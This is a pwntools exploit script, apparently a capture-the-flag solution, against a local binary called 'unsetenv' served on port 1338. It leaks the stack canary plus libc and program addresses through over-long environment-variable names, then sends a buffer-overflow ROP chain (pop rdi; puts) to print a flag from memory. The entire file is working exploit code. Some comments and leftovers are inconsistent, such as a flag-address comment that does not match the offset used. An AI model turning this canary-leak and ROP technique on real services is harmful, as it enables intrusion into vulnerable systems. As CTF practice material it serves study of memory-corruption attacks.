#!/usr/bin/env python3
from pwn import * 
from pwnlib.util.misc import run_in_new_terminal

binary = "./unsetenv_patched"
context.binary = binary
libc = ELF("./libc.so.6")
elf = ELF(binary)
#p = process(binary)
p = remote('localhost', 1338)
sleep(1)

gdbscript = '''
break *main+281
break *puts+114
continue
'''

pid = pidof('unsetenv')[0] 
run_in_new_terminal(f'gdb -p {pid} -ex "{gdbscript}"')




s = '''context.binary = binarycontext.binary = binary
b * main+281
b * puts+114
'''

#gdb.attach(p, s)
#p.interactive()
p.recvuntil(b"Enter the name of an environment variable:")
p.sendline(b"AAAAAAAA")
p.recvuntil(b"variable ")
output = p.recvuntil(b" is")
#print("output:", output)
canary_bytes = output[8:16]
#print("canary in bytes:", canary_bytes)
canary = u64(canary_bytes)
canary = canary & 0xffffffffffffff00  
print(hex(canary)) # got it! 



p.recvuntil(b"Enter the name of an environment variable:")
p.sendline(b"A" * 23)
p.recvuntil(b"variable ")
output = p.recvuntil(b" is")
#print("output:", output)
leak_libc_bytes = output[24:30].ljust(8, b'\x00')
#print("canary in bytes:", leak_libc_bytes)
leak_libc = u64(leak_libc_bytes)
#print(hex(leak_libc))

p.recvuntil(b"Enter the name of an environment variable:")
p.sendline(b"A" * 31)
p.recvuntil(b"variable ")
output = p.recvuntil(b" is")
#print("output:", output)
leak_bytes = output[32:38].ljust(8, b'\x00')
#print("canary in bytes:", leak_bytes)
leak = u64(leak_bytes)
#print(hex(leak))

#print(hex(flag_addr))


libc.address = leak_libc + 0x30 - libc.sym['__libc_start_main']

pop_rdi = next(libc.search(asm('pop rdi; ret')))

#print(hex(leak_libc))




# The flag address always ends in fc7 
# The offset is either 0x1000 or 0x2000 from the leaked address 
base = leak & ~0xfff

offset = 74 if "OFFSET" not in args else int(args["OFFSET"])

flag_addr = base + 0xfd9 # fc7 is ending 3 digits

p.recvuntil(b"Enter feedback for this challenge below:\n")
payload = flat(
    b"A" * 8,       # Buffer
    canary,         # Canary
    b"A" * 8,       # old rbp
    pop_rdi,
    flag_addr,      # address of flag                         
    libc.sym['puts']# Print the result
)
p.sendline(payload)


p.interactive()